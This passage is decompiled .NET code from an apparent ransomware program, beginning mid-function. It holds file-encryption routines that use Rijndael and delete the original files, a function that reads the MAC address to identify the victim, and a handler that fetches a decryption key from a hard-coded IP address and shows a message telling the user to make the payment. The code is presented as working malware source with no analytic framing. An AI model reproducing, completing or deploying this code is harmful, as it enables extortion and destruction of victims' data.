						IL_0058:
						num9 = num8;
						num7 = upperBound2;
						if (num9 <= num7)
						{
							goto IL_003e;
						}
						goto IL_0062;
						IL_0062:
						num = 8;
						sHA512Managed = new SHA512Managed();
						goto IL_006c;
						IL_006c:
						num = 9;
						array4 = sHA512Managed.ComputeHash(array);
						goto IL_0079;
						IL_0079:
						num = 10;
						array3 = new byte[16];
						goto IL_0085;
						IL_0085:
						num = 11;
						num5 = 32;
						goto IL_00a3;
						end_IL_0001_2:
						break;
					}
					num = 14;
					array5 = array3;
					break;
				}
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 275;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		byte[] result = array5;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private void method_2(string string_2, string string_3, byte[] byte_0, byte[] byte_1, Enum0 enum0_0)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		byte[] buffer = default(byte[]);
		CryptoStream cryptoStream = default(CryptoStream);
		long num6 = default(long);
		long length = default(long);
		RijndaelManaged rijndaelManaged = default(RijndaelManaged);
		FileInfo fileInfo = default(FileInfo);
		FileInfo fileInfo2 = default(FileInfo);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 537:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0019;
						case 4:
							goto IL_0029;
						case 5:
							goto IL_0038;
						case 6:
							goto IL_0045;
						case 7:
							goto IL_004a;
						case 8:
							goto IL_0059;
						case 9:
							goto IL_0062;
						case 11:
						case 13:
							goto IL_007c;
						case 15:
						case 16:
							goto IL_0099;
						case 20:
							goto IL_00b6;
						case 21:
							goto IL_00cd;
						case 22:
							goto IL_00db;
						case 10:
						case 14:
						case 17:
						case 18:
						case 19:
						case 23:
							goto IL_00e4;
						case 24:
							goto IL_00ee;
						case 25:
							goto IL_00f8;
						case 26:
							goto IL_0106;
						case 27:
							goto IL_0114;
						case 28:
							goto IL_011e;
						case 29:
							goto IL_0129;
						case 30:
						case 31:
							goto IL_0133;
						case 32:
							goto IL_013d;
						case 33:
							goto IL_0148;
						case 34:
						case 35:
							goto IL_0152;
						case 36:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 37:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_00b6:
					num = 20;
					num5 = fileStream_0.Read(buffer, 0, 4096);
					goto IL_00cd;
					IL_00cd:
					num = 21;
					cryptoStream.Write(buffer, 0, num5);
					goto IL_00db;
					IL_0152:
					num = 35;
					fileStream_0.Close();
					break;
					IL_00db:
					num = 22;
					num6 = checked(num6 + num5);
					goto IL_00e4;
					IL_0009:
					num = 2;
					fileStream_0 = new FileStream(string_2, FileMode.Open, FileAccess.Read);
					goto IL_0019;
					IL_0019:
					num = 3;
					fileStream_1 = new FileStream(string_3, FileMode.OpenOrCreate, FileAccess.Write);
					goto IL_0029;
					IL_0029:
					num = 4;
					fileStream_1.SetLength(0L);
					goto IL_0038;
					IL_0038:
					num = 5;
					buffer = new byte[4097];
					goto IL_0045;
					IL_0045:
					num = 6;
					num6 = 0L;
					goto IL_004a;
					IL_004a:
					num = 7;
					length = fileStream_0.Length;
					goto IL_0059;
					IL_0059:
					num = 8;
					rijndaelManaged = new RijndaelManaged();
					goto IL_0062;
					IL_0062:
					num = 9;
					switch (enum0_0)
					{
					case Enum0.const_0:
						break;
					case Enum0.const_1:
						goto IL_0099;
					default:
						goto IL_00e4;
					}
					goto IL_007c;
					IL_0099:
					num = 16;
					cryptoStream = new CryptoStream(fileStream_1, rijndaelManaged.CreateDecryptor(byte_0, byte_1), CryptoStreamMode.Write);
					goto IL_00e4;
					IL_007c:
					num = 13;
					cryptoStream = new CryptoStream(fileStream_1, rijndaelManaged.CreateEncryptor(byte_0, byte_1), CryptoStreamMode.Write);
					goto IL_00e4;
					IL_00e4:
					num = 19;
					if (num6 < length)
					{
						goto IL_00b6;
					}
					goto IL_00ee;
					IL_00ee:
					num = 24;
					cryptoStream.Close();
					goto IL_00f8;
					IL_00f8:
					num = 25;
					fileStream_0.Close();
					goto IL_0106;
					IL_0106:
					num = 26;
					fileStream_1.Close();
					goto IL_0114;
					IL_0114:
					num = 27;
					if (enum0_0 == Enum0.const_0)
					{
						goto IL_011e;
					}
					goto IL_0133;
					IL_011e:
					num = 28;
					fileInfo = new FileInfo(string_2);
					goto IL_0129;
					IL_0129:
					num = 29;
					fileInfo.Delete();
					goto IL_0133;
					IL_0133:
					num = 31;
					if (enum0_0 == Enum0.const_1)
					{
						goto IL_013d;
					}
					goto IL_0152;
					IL_013d:
					num = 32;
					fileInfo2 = new FileInfo(string_2);
					goto IL_0148;
					IL_0148:
					num = 33;
					fileInfo2.Delete();
					goto IL_0152;
					end_IL_0001_2:
					break;
				}
				num = 36;
				fileStream_1.Close();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 537;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public object GetMAC()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		NetworkInterface[] allNetworkInterfaces = default(NetworkInterface[]);
		object obj = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 71:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 4:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0009:
					num = 2;
					allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
					break;
					end_IL_0001_2:
					break;
				}
				num = 3;
				obj = allNetworkInterfaces[0].GetPhysicalAddress().ToString();
				break;
				end_IL_0001:;
			}
			catch (object obj2) when (obj2 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				try0001_dispatch = 71;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		object result = obj;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private void method_3(object sender, EventArgs e)
	{
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string decryptKey = default(string);
		string text = default(string);
		string path = default(string);
		WebClient webClient = default(WebClient);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 198:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_002f;
						case 5:
							goto IL_0037;
						case 7:
							goto IL_0046;
						case 8:
							goto IL_0048;
						case 9:
							goto IL_0055;
						case 10:
							goto IL_005f;
						case 11:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 6:
						case 12:
						case 13:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0048:
					num = 8;
					decryptKey = text.Substring(0, 20);
					goto IL_0055;
					IL_0055:
					num = 9;
					path = "C:\\";
					goto IL_005f;
					IL_0046:
					num = 7;
					goto IL_0048;
					IL_005f:
					num = 10;
					DecryptFiles(path, decryptKey);
					break;
					IL_0009:
					num = 2;
					webClient = new WebClient();
					goto IL_0011;
					IL_0011:
					num = 3;
					text = webClient.DownloadString("http://5.199.171.47/" + GetuID() + "/key");
					goto IL_002f;
					IL_002f:
					num = 4;
					if (text == null)
					{
						goto IL_0037;
					}
					goto IL_0046;
					IL_0037:
					num = 5;
					MessageBox.Show("Your payment has not yet been either received or processed.\r\nPlease make the payment and try again.  If you've already\r\nmade a payment, note that it may take up to 24 hours\r\nto process your payment and activate your key.");
					goto end_IL_0001_3;
					end_IL_0001_2:
					break;
				}
				num = 11;
				MessageBox.Show("Decryption process complete.");
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 198;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_4(object sender, EventArgs e)
	{
		Application.Exit();
	}
}
